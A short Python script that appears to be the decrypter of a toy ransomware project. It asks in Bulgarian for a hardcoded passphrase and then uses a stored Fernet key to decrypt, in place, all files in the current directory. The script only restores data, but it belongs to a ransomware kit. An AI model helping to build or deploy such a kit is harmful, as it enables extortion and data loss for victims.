#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "Ransomware.py" or file == "thekey.key" or file == "decrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "123456789"
user_phrase = input("Въведете вълшебните цифри, за да отключите вашите файлове:\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Поздравления, вие отключихте вашите файлове!")
else:
    print("Грешка, отидете и научите магическите цифри!")
